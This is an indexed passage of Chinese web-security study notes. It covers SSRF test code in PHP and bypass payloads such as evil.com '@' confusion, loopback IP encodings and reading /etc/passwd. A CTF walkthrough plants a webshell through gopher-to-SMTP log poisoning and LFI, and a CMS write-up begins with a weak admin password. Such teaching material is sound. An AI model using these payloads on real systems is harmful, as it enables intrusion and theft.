fsockopen()\u5c06\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u53e5\u67c4\uff0c\u4e4b\u540e\u53ef\u4ee5\u88ab\u5176\u4ed6\u6587\u4ef6\u7c7b\u51fd\u6570\u8c03\u7528\uff08\u4f8b\u5982\uff1afgets()\uff0cfgetss()\uff0cfwrite()\uff0cfclose()\u8fd8\u6709feof()\uff09\u3002\u5982\u679c\u8c03\u7528\u5931\u8d25\uff0c\u5c06\u8fd4\u56defalse\u3002</p> <pre><code>// ssrf.php\n&lt;?php\n$host=$_GET['url'];\n$fp = fsockopen($host, 80, $errno, $errstr, 30);\nif (!$fp) {\necho \"$errstr ($errno)&lt;br /&gt;\\n\";\n} else {\n$out = \"GET / HTTP/1.1\\r\\n\";\n$out .= \"Host: $host\\r\\n\";\n$out .= \"Connection: Close\\r\\n\\r\\n\";\nfwrite($fp, $out);\nwhile (!feof($fp)) {\necho fgets($fp, 128);\n}\nfclose($fp);\n}\n?&gt;\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#curl_exec","title":"curl_exec()","text":"<p>curl_init(url)\u51fd\u6570\u521d\u59cb\u5316\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\uff0c\u8fd4\u56de\u4e00\u4e2acURL\u53e5\u67c4\uff0c\u4f9bcurl_setopt()\uff0ccurl_exec()\u548ccurl_close() \u51fd\u6570\u4f7f\u7528\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php if (isset($_GET['url'])){  $link = $_GET['url'];   $curlobj = curl_init(); // \u521b\u5efa\u65b0\u7684 cURL \u8d44\u6e90 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link);    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // \u8bbe\u7f6e URL \u548c\u76f8\u5e94\u7684\u9009\u9879  $result=curl_exec($curlobj); // \u6293\u53d6 URL \u5e76\u628a\u5b83\u4f20\u9012\u7ed9\u6d4f\u89c8\u5668    curl_close($curlobj); // \u5173\u95ed cURL \u8d44\u6e90\uff0c\u5e76\u4e14\u91ca\u653e\u7cfb\u7edf\u8d44\u6e90    // $filename = './curled/'.rand().'.txt';   // file_put_contents($filename, $result);   echo $result;}?&gt;\n</code></pre> <p>\u6784\u9020<code>ssrf.php?url=www.baidu.com</code>\u5373\u53ef\u6210\u529f\u89e6\u53d1ssrf\u5e76\u8fd4\u56de\u767e\u5ea6\u4e3b\u9875\uff1a</p> <p></p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#soapclient","title":"SoapClient","text":"<p>\u7701\u7565\u4e86</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u5bf9\u4e8eSSRF\u7684\u9650\u5236\u5927\u81f4\u6709\u5982\u4e0b\u51e0\u79cd\uff1a</p> <p>\u9650\u5236\u8bf7\u6c42\u7684\u7aef\u53e3\u53ea\u80fd\u4e3aWeb\u7aef\u53e3\uff0c\u53ea\u5141\u8bb8\u8bbf\u95eeHTTP\u548cHTTPS\u7684\u8bf7\u6c42\u3002</p> <ul> <li>\u9650\u5236\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com</li> </ul> <p>\u9650\u5236\u4e0d\u80fd\u8bbf\u95ee\u5185\u7f51\u7684IP\uff0c\u4ee5\u9632\u6b62\u5bf9\u5185\u7f51\u8fdb\u884c\u653b\u51fb\u3002</p> <ul> <li> <p>\u5c4f\u853d\u8fd4\u56de\u7684\u8be6\u7ec6\u4fe1\u606f\u3002</p> </li> <li></li> </ul>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#http","title":"\u5229\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7","text":"<p>\u5982\u679c\u76ee\u6807\u4ee3\u7801\u9650\u5236\u8bbf\u95ee\u7684\u57df\u540d\u53ea\u80fd\u4e3ahttp://www.xxx.com\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u91c7\u7528HTTP\u57fa\u672c\u8eab\u4efd\u8ba4\u8bc1\u7684\u65b9\u5f0f\u7ed5\u8fc7\u3002\u5373@\uff1ahttp://www.xxx.com@www.evil.com</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#302ip","title":"\u5229\u7528302\u8df3\u8f6c\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u7ed5\u8fc7\u5bf9\u5185\u7f51ip\u7684\u9650\u5236\u6211\u4eec\u53ef\u4ee5\u5229\u7528302\u8df3\u8f6c\u7684\u65b9\u6cd5\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u3002</p> <p>\uff081\uff09\u7f51\u7edc\u4e0a\u5b58\u5728\u4e00\u4e2a\u5f88\u795e\u5947\u7684\u670d\u52a1\uff0c\u7f51\u5740\u4e3ahttp://xip.io\uff0c\u5f53\u8bbf\u95ee\u8fd9\u4e2a\u670d\u52a1\u7684\u4efb\u610f\u5b50\u57df\u540d\u7684\u65f6\u5019\uff0c\u90fd\u4f1a\u91cd\u5b9a\u5411\u5230\u8fd9\u4e2a\u5b50\u57df\u540d\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <p>\u5f53\u6211\u4eec\u8bbf\u95ee\uff1ahttp://127.0.0.1.xip.io/flag.php\u65f6\uff0c\u5b9e\u9645\u8bbf\u95ee\u7684\u662fhttp://127.0.0.1/1.php\u3002\u50cf\u8fd9\u79cd\u7f51\u5740\u8fd8\u6709http://nip.io\uff0chttp://sslip.io\u3002</p> <p>\u5982\u4e0b\u793a\u4f8b\uff08flag.php\u4ec5\u80fd\u4ece\u672c\u5730\u8bbf\u95ee\uff09\uff1a</p> <p></p> <p>\uff082\uff09\u77ed\u5730\u5740\u8df3\u8f6c\u7ed5\u8fc7\uff0c\u8fd9\u91cc\u4e5f\u7ed9\u51fa\u4e00\u4e2a\u7f51\u5740https://4m.cn/\uff1a</p> <p></p> <p>\u76f4\u63a5\u4f7f\u7528\u751f\u6210\u7684\u77ed\u8fde\u63a5https://4m.cn/FjOdQ\u5c31\u4f1a\u81ea\u52a8302\u8df3\u8f6c\u5230http://127.0.0.1/flag.php\u4e0a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u7ed5\u8fc7WAF\u4e86\uff1a</p> <p></p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#ip","title":"\u8fdb\u5236\u7684\u8f6c\u6362\u7ed5\u8fc7\u5185\u7f51IP","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u4e0d\u540c\u7684\u8fdb\u5236\u66ff\u4ee3ip\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\uff0c\u8fd9\u91cc\u7ed9\u51fa\u4e2a\u4ece\u7f51\u4e0a\u6252\u7684php\u811a\u672c\u53ef\u4ee5\u4e00\u952e\u8f6c\u6362\uff1a</p> <pre><code>&lt;?php$ip = '127.0.0.1';$ip = explode('.',$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) {$r += 4294967296;}echo \"\u5341\u8fdb\u5236:\"; \u00a0 \u00a0 // 2130706433echo $r;echo \"\u516b\u8fdb\u5236:\"; \u00a0 \u00a0 // 0177.0.0.1echo decoct($r);echo \"\u5341\u516d\u8fdb\u5236:\"; \u00a0 // 0x7f.0.0.1echo dechex($r);?&gt;\n</code></pre>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#127001","title":"\u5176\u4ed6\u5404\u79cd\u6307\u5411127.0.0.1\u7684\u5730\u5740","text":"<pre><code>http://localhost/ \u00a0 \u00a0 \u00a0 \u00a0 # localhost\u5c31\u662f\u4ee3\u6307127.0.0.1http://0/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # 0\u5728window\u4e0b\u4ee3\u88680.0.0.0\uff0c\u800c\u5728liunx\u4e0b\u4ee3\u8868127.0.0.1http://[0:0:0:0:0:ffff:127.0.0.1]/ \u00a0 \u00a0# \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://[::]:80/ \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # \u5728liunx\u4e0b\u53ef\u7528\uff0cwindow\u6d4b\u8bd5\u4e86\u4e0b\u4e0d\u884chttp://127\u30020\u30020\u30021/ \u00a0 \u00a0 \u00a0 # \u7528\u4e2d\u6587\u53e5\u53f7\u7ed5\u8fc7http://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460http://127.1/http://127.00000.00000.001/ # 0\u7684\u6570\u91cf\u591a\u4e00\u70b9\u5c11\u4e00\u70b9\u90fd\u6ca1\u5f71\u54cd\uff0c\u6700\u540e\u8fd8\u662f\u4f1a\u6307\u5411127.0.0.1\n</code></pre>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#_3","title":"\u5229\u7528\u4e0d\u5b58\u5728\u7684\u534f\u8bae\u5934\u7ed5\u8fc7\u6307\u5b9a\u7684\u534f\u8bae\u5934","text":"<p><code>file_get_contents()</code>\u51fd\u6570\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u5373\u5f53PHP\u7684<code>file_get_contents()</code>\u51fd\u6570\u5728\u9047\u5230\u4e0d\u8ba4\u8bc6\u7684\u534f\u8bae\u5934\u65f6\u5019\u4f1a\u5c06\u8fd9\u4e2a\u534f\u8bae\u5934\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u9020\u6210\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u8fd9\u65f6\u5019\u53ea\u9700\u4e0d\u65ad\u5f80\u4e0a\u8df3\u8f6c\u76ee\u5f55\u5373\u53ef\u8bfb\u5230\u6839\u76ee\u5f55\u7684\u6587\u4ef6\u3002\uff08include()\u51fd\u6570\u4e5f\u6709\u7c7b\u4f3c\u7684\u7279\u6027\uff09</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?phphighlight_file(__FILE__);if(!preg_match('/^https/is',$_GET['url'])){die(\"no hack\");}echo file_get_contents($_GET['url']);?&gt;\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u9650\u5236\u4e86url\u53ea\u80fd\u662f\u4ee5https\u5f00\u5934\u7684\u8def\u5f84\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5982\u4e0b\uff1a</p> <pre><code>httpsssss://\n</code></pre> <p>\u6b64\u65f6<code>file_get_contents()</code>\u51fd\u6570\u9047\u5230\u4e86\u4e0d\u8ba4\u8bc6\u7684\u4f2a\u534f\u8bae\u5934\u201chttpsssss://\u201d\uff0c\u5c31\u4f1a\u5c06\u4ed6\u5f53\u505a\u6587\u4ef6\u5939\uff0c\u7136\u540e\u518d\u914d\u5408\u76ee\u5f55\u7a7f\u8d8a\u5373\u53ef\u8bfb\u53d6\u6587\u4ef6\uff1a</p> <pre><code>ssrf.php?url=httpsssss://../../../../../../etc/passwd\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u5728SSRF\u7684\u4f17\u591a\u534f\u8bae\u88ab\u7981\u6b62\u4e14\u53ea\u80fd\u4f7f\u7528\u5b83\u89c4\u5b9a\u7684\u67d0\u4e9b\u534f\u8bae\u7684\u60c5\u51b5\u4e0b\u6765\u8fdb\u884c\u8bfb\u53d6\u6587\u4ef6\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/ssrf/#url","title":"\u5229\u7528URL\u7684\u89e3\u6790\u95ee\u9898","text":"<p>\u8be5\u601d\u8def\u6765\u81eaOrange Tsai\u6210\u5458\u57282017 BlackHat \u7f8e\u56fd\u9ed1\u5ba2\u5927\u4f1a\u4e0a\u505a\u7684\u9898\u4e3a\u300aA-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages\u300b\u7684\u5206\u4eab\u3002\u4e3b\u8981\u662f\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u4ee5\u53cacurl\u548cparse_url\u89e3\u6790\u5dee\u5f02\u6765\u8fdb\u884c\u7ed5\u8fc7\u3002</p> <p>\uff081\uff09\u5229\u7528readfile\u548cparse_url\u51fd\u6570\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u8fc7\u6307\u5b9a\u7684\u7aef\u53e3</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>// ssrf.php&lt;?php$url = 'http://'. $_GET[url];$parsed = parse_url($url);if( $parsed[port] == 80 ){  // \u8fd9\u91cc\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684    readfile($url);} else { die('Hacker!');}\n</code></pre> <p>\u7528python\u5728\u5f53\u524d\u76ee\u5f55\u4e0b\u8d77\u4e00\u4e2a\u7aef\u53e3\u4e3a11211\u7684WEB\u670d\u52a1\uff1a</p> <p></p> <p>\u4e0a\u8ff0\u4ee3\u7801\u9650\u5236\u4e86\u6211\u4eec\u4f20\u8fc7\u53bb\u7684url\u53ea\u80fd\u662f80\u7aef\u53e3\u7684\uff0c\u4f46\u5982\u679c\u6211\u4eec\u60f3\u53bb\u8bfb\u53d611211\u7aef\u53e3\u7684\u6587\u4ef6\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u4ee5\u4e0b\u65b9\u6cd5\u7ed5\u8fc7\uff1a</p> <pre><code>ssrf.php?url=127.0.0.1:11211:80/flag.txt\n</code></pre> <p></p> <p>\u5982\u4e0a\u56fe\u6240\u793a\u6210\u529f\u8bfb\u53d6\u4e8611211\u7aef\u53e3\u4e2d\u7684flag.txt\u6587\u4ef6\uff0c\u4e0b\u9762\u7528BlackHat\u7684\u56fe\u6765\u8bf4\u660e\u539f\u7406\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u51fareadfile()\u51fd\u6570\u83b7\u53d6\u7684\u7aef\u53e3\u662f\u6700\u540e\u5192\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff0811211\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f\u6700\u540e\u5192\u53f7\u540e\u9762\u7684\u7684\u7aef\u53e3\uff0880\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u3002</p> <p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u5728\u89e3\u6790host\u7684\u65f6\u5019\u4e5f\u6709\u5dee\u5f02\uff0c\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>readfile()\u51fd\u6570\u83b7\u53d6\u7684\u662f@\u53f7\u540e\u9762\u4e00\u90e8\u5206\uff08evil.com\uff09\uff0c\u800cparse_url()\u51fd\u6570\u83b7\u53d6\u7684\u5219\u662f@\u53f7\u524d\u9762\u7684\u4e00\u90e8\u5206\uff08google.com\uff09\uff0c\u5229\u7528\u8fd9\u79cd\u5dee\u5f02\u7684\u4e0d\u540c\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\uff082\uff09\u5229\u7528curl\u548cparse_url\u7684\u89e3\u6790\u5dee\u5f02\u7ed5\u6307\u5b9a\u7684host</p> <p>\u539f\u7406\u5982\u4e0b\uff1a</p> <p></p> <p>\u4ece\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u5230curl()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e00\u4e2a@\u540e\u9762\u7684\u7f51\u5740\uff0c\u800cparse_url()\u51fd\u6570\u89e3\u6790\u7684\u662f\u7b2c\u4e8c\u4e2a@\u540e\u9762\u7684\u7f51\u5740\u3002\u5229\u7528\u8fd9\u4e2a\u539f\u7406\u6211\u4eec\u53ef\u4ee5\u7ed5\u8fc7\u9898\u76ee\u4e2dparse_url()\u51fd\u6570\u5bf9\u6307\u5b9ahost\u7684\u9650\u5236\u3002</p> <p>\u6d4b\u8bd5\u4ee3\u7801\uff1a</p> <pre><code>&lt;?phphighlight_file(__FILE__);function check_inner_ip($url){    $match_result=preg_match('/^(http|https)?:\\/\\/.*(\\/)?.*$/',$url);    if (!$match_result)    {        die('url fomat error');    }    try    {        $url_parse=parse_url($url);    }    catch(Exception $e)    {        die('url fomat error');        return false;    }    $hostname=$url_parse['host'];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16;// \u68c0\u67e5\u662f\u5426\u662f\u5185\u7f51ip}function safe_request_url($url){    if (check_inner_ip($url))    {        echo $url.' is inner ip';    }    else    {        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info['redirect_url'])        {            safe_request_url($result_info['redirect_url']);        }        curl_close($ch);        var_dump($output);    }}$url = $_GET['url'];if(!empty($url)){    safe_request_url($url);}?&gt;\n</code></pre> <p>\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230<code>check_inner_ip</code>\u51fd\u6570\u901a\u8fc7<code>url_parse()</code>\u51fd\u6570\u68c0\u6d4b\u662f\u5426\u4e3a\u5185\u7f51IP\uff0c\u5982\u679c\u4e0d\u662f\u5185\u7f51 IP \uff0c\u5219\u901a\u8fc7<code>curl()</code>\u8bf7\u6c42 url \u5e76\u8fd4\u56de\u7ed3\u679c\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528curl\u548cparse_url\u89e3\u6790\u7684\u5dee\u5f02\u4e0d\u540c\u6765\u7ed5\u8fc7\u8fd9\u91cc\u7684\u9650\u5236\uff0c\u8ba9<code>parse_url()</code>\u5904\u7406\u5916\u90e8\u7f51\u7ad9\u7f51\u5740\uff0c\u6700\u540e<code>curl()</code>\u8bf7\u6c42\u5185\u7f51\u7f51\u5740\u3002paylaod\u5982\u4e0b\uff1a</p> <pre><code>ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\n</code></pre> <p></p> <p>\u7684 [2020 \u9996\u5c4a\u201c\u7965\u4e91\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b]doyouknowssrf\u8fd9\u9053\u9898\u5229\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\u601d\u8def\u3002</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/%E4%B8%BE%E4%BE%8B%E4%BE%8B%E9%A2%98/","title":"\u4e3e\u4f8b\u4f8b\u9898","text":"<pre><code>&lt;?php\nhighlight_file(__FILE__);\n$x = $_GET['x'];\n$pos = strpos($x,\"php\");\nif($pos){\n        exit(\"denied\");\n}\n$ch = curl_init();\ncurl_setopt($ch,CURLOPT_URL,\"$x\");\ncurl_setopt($ch,CURLOPT_RETURNTRANSFER,true);\n$result = curl_exec($ch);\necho $result;\n</code></pre> <p>\u9996\u5148x\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\uff0c</p> <p>x\u53ef\u5229\u7528\u7684\u534f\u8bae\u6709gopher\u3001dict\u3001http\u3001https\u3001file\u7b49</p> <p>ps:\u7ecf\u5e38gopher\u534f\u8bae\u662f\u4f1a\u7ed9\u63d0\u793a\u7684\uff08\u6bd4\u5982\u7ed9\u51fa\u534f\u8bae\uff1aXXX\u534f\u8bae\u8fc7\u6ee4\u540e\u53d1\u73b0\u5c31\u8fd9\u4e2a\u80fd\u7528\u6216\u8005\u76f4\u63a5\u653e\u5728\u767d\u540d\u5355\u91cc\u9762\u63d0\u793a\uff09</p> <p>file\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u67e5\u770b\u6587\u4ef6</p> <p>dict\u534f\u8bae\u53ef\u4ee5\u7528\u4e8e\u523a\u63a2\u7aef\u53e3</p> <p>gopher\u534f\u8bae\u652f\u6301GET&amp;POST\u8bf7\u6c42\uff0c\u5e38\u7528\u4e8e\u653b\u51fb\u5185\u7f51ftp\u3001redis\u3001telnet\u3001smtp\u7b49\u670d\u52a1\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528gopher\u534f\u8bae\u8bbf\u95eeredis\u53cd\u5f39shell</p> <p>\u9996\u5148\u6211\u4eec\u5229\u7528file\u8bfb\u53d6\u6587\u4ef6</p> <p>\u5148\u4e0a\u811a\u672c\u626b\u63cf\u4e00\u4e0b\u76ee\u5f55\uff0c\u5f97\u5230flag.php\u3002</p> <p>\u4e00\u822c\u6211\u4eec\u8fd8\u53ef\u4ee5\u8bfb\u53d6/etc/hosts\uff0c/etc/passwd\uff0c~/.bash_history\u7b49\u6587\u4ef6\u67e5\u770b\u7ebf\u7d22</p> <p>\u4f46\u662f\u4ee3\u7801\u4e2d\u6709strpos\u7684\u9650\u5236\uff08\u5229\u7528%2570\u7ed5\u8fc7\uff09</p> <p>\u6700\u540e\u6211\u4eec\u8bfb\u53d6/var/www/html/flag.php\u65f6\u53d1\u73b0\u7ebf\u7d22</p> <p></p> <p>\u7ee7\u7eed\u8bfb\u53d6<code>/etc/hosts</code>\u5f97\u5230\u4e00\u4e2a\u5185\u7f51\u5730\u5740</p> <p></p> <p>\u8fd9\u513f\u6211\u4eec\u5f97\u5230\u5185\u7f51\u6bb5\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u626b\u63cf\uff0c\u53d1\u73b0\u53ea\u6709172.18.0.1|2|3\u53ef\u4ee5\u8bbf\u95ee\u3002</p> <p>http://101.71.29.5:10012/?x=http://172.18.0.2\u7684\u8fd4\u56de\u7ed3\u679c\u5982\u4e0b\u56fe\uff0c\u5b58\u5728LFI\u6f0f\u6d1e\u3002</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u8fd9\u53ea\u662f80\u7aef\u53e3\u7684\u7ed3\u679c\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u770b\u770b\u5176\u4ed6\u7aef\u53e3\u7684\u5f00\u653e\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\uff0c25\u7aef\u53e3\u4e5f\u5f00\u653e\u4e86\uff0c25\u5bf9\u5e94\u7684\u5c31\u662fsmtp\u670d\u52a1</p> <p></p> <p>\u5229\u7528gopher\u534f\u8bae\u6253smtp\uff0c\u7136\u540e\u518d\u7ed3\u5408\u4e4b\u524d\u53d1\u73b0\u7684LFI\u6f0f\u6d1e\uff0c\u5f97\u51fa\u8fd9\u6837\u7684\u601d\u8def</p> <p>\u5229\u7528gopher\u6253smtp\uff0c\u5728\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7559\u4e0b\u4e00\u53e5\u8bdd\u6728\u9a6c\uff0c\u7136\u540e\u7528LFI\u5305\u542b\u65e5\u5fd7\u6587\u4ef6\u83b7\u53d6webshell</p> <p>\u601d\u8def\u6e05\u6670\u4e86\u540e\uff0c\u5c31\u5f00\u59cb\u6267\u884c\u4e86\uff0c\u5148\u7528gopherus\u811a\u672c\u751f\u6210payload\uff0cgopherus\u5730\u5740:https://github.com/tarunkant/Gopherus\uff0c\u91cc\u9762\u6709\u8be6\u7ec6\u7528\u6cd5\u3002</p> <p></p> <p>\u5c06127.0.0.1:25\u6539\u4e3a\u5185\u7f51\u5730\u5740\uff0c\u7136\u540eurl\u7f16\u7801\u53d1\u9001\u8fc7\u53bb</p> <p>\u7136\u540e\u6211\u4eec\u5229\u7528\u5305\u542b\u65e5\u5fd7\u6587\u4ef6</p> <p>\u4e8e\u662f\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u53bb\u627esmtp\u7684\u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\u4e86\uff0c\u4e00\u822c\u6765\u8bb2linux\u4e2d\u7684\u90ae\u4ef6\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\u4e3a</p> <p>/var/log/maillog</p> <p>/var/log/mail.log</p> <p>/var/adm/maillog</p> <p>/var/adm/syslog/mail.log</p> <p>\u5728\u8fd9\u91cc\u63d2\u5165\u56fe\u7247\u63cf\u8ff0</p> <p>\u7136\u540e\u6211\u4eec\u76f4\u63a5\u8fde\u63a5\u83dc\u5200\u67e5\u770bflag</p>"},{"location":"web_bak/csrf_ssrf_ssi/SSRF/%E7%BB%83%E4%B9%A0/","title":"\u7ec3\u4e60","text":"<p>\u8fd9\u4f4d\u53cb\u597d\u7684\u4f5c\u8005\u8fd8\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u9776\u573a</p> <p>\u63a8\u8350\u4e00\u4e2aSSRF\u7ec3\u4e60\u9776\u573a\uff1a</p> <p>ssrf-lab\uff1a</p> <p>fengwenhua/ssrf-lab</p> <p>ssrf\u6f0f\u6d1e\u5b9e\u9a8c. Contribute to fengwenhua/ssrf-lab development by creating an account on GitHub.</p> <p>https://github.com/fengwenhua/ssrf-lab</p> <p></p> <p>\u8be5\u9776\u573a\u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u914d\u7f6e\u8bf7\u770b\uff1a</p> <p>SSRF \u6f0f\u6d1e\u5b66\u4e60\u5b9e\u9a8c\u73af\u5883\u63a8\u8350\u53ca\u8fc7\u7a0b\u8bb0\u5f55\u4e28\u4fe1\u5b89\u4e4b\u8def_\u5b89\u5168\u6587\u6458_\u9ed1\u767d\u7f51</p> <p>\u5728\u7f51\u4e0a\u627e\u5230\u4e00\u4e2a\u5b66\u4e60 SSRF \u7684\u73af\u5883\uff0cSSRF-LABS \u6709\u4e00\u4e2a\u597d\u770b\u53c8\u7b80\u6d01\u7684\u754c\u9762\uff0c\u63d0\u4f9b\u4e86\u6700\u57fa\u672c\u7684 REST API \u548c\u5ba2\u6237\u7aef WebHook \u529f\u80fd\u7528\u4e8e SSRF \u6d4b\u8bd5\u3002\u524d\u9762\u53ea\u662f\u5927\u6982\u7684\u4ecb\u7ecd\uff0c\u77e5\u9053\u5c31\u597d\uff0c\u4e0d\u7528\u82b1\u8d39\u8fc7\u591a\u7cbe\u529b\u4e86\u89e3\u3002SSRF \u4ecb\u7ecd\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u7528\u6237\u901a\u8fc7 WEB \u8bbf...</p> <p>https://www.heibai.org/post/1287.html</p>"},{"location":"web_bak/ctf/%5BGKCTF2021%5Deasycms/","title":"[GKCTF2021]easycms","text":"<p>[GKCTF 2021]easycms</p> <p>\u5f53\u65f6\u7535\u8111py\u73af\u5883\u51fa\u4e86\u8f83\u5927\u95ee\u9898</p> <p>\u770b\u7740WP\u590d\u73b0\uff08\u4e0d\u662f\uff09</p> <p>\u540c\u65f6\u7a0d\u5fae\u4f5c\u70b9\u603b\u7ed3</p> <p>admin.php(buu\u4e0a\u626b\u4e0d\u4e86)</p> <p>admin + 12345\u5f31\u53e3\u4ee4\uff08\u5b8c\u5168\u53ef\u4ee5\u52a0\u4e2asql\u6ce8\u5165\uff09</p> <p>\u7136\u540e\u5c31\u89c1\u5230\u4e86\u6211\u4eec\u7684cms</p> <p></p> <p>\u6700\u5f00\u59cb\u51c6\u5907\u8bd5cms\u4e00\u4e9bcve\uff0c\u5728\u7f51\u4e0a\u627e\u5230\u7684CVE\u5927\u591a\u6570\u90fd\u6709\u4e9b\u8001\uff0c\u6700\u65b0\u7684\u4e5f\u57286.x\u7248\u672c\uff0c\u800c\u8fd9\u4e2a\u662f7.x\u7248\u672c\uff0c\u4e0d\u5927\u7528\u7684\u4e86\u3002</p> <p>\u7136\u540e\u624b\u52a8\u722c\u7ad9</p> <p>\u6000\u7591\u8fc7\u8fd9\u4e2a</p> <p>\u6000\u7591\u8fd9\u4e2a\u662f\u56e0\u4e3a\u4e4b\u524d\u6709\u8fc7\u9898\u76ee\u53ef\u4ee5\u4e0a\u4f20\u4e00\u4e2a\u88ab\u7be1\u6539\u7684\u4e3b\u9898\u7136\u540e\u663e\u793a\u62ff\u5230\u6743\u9650\u3002</p> <p>\u7136\u540e\u5e76\u4e0d\u662f\uff0c\u4f46\u662f\u6709\u66f4\u4e3a\u53ef\u7591\u7684\u5730\u65b9\u3002</p> 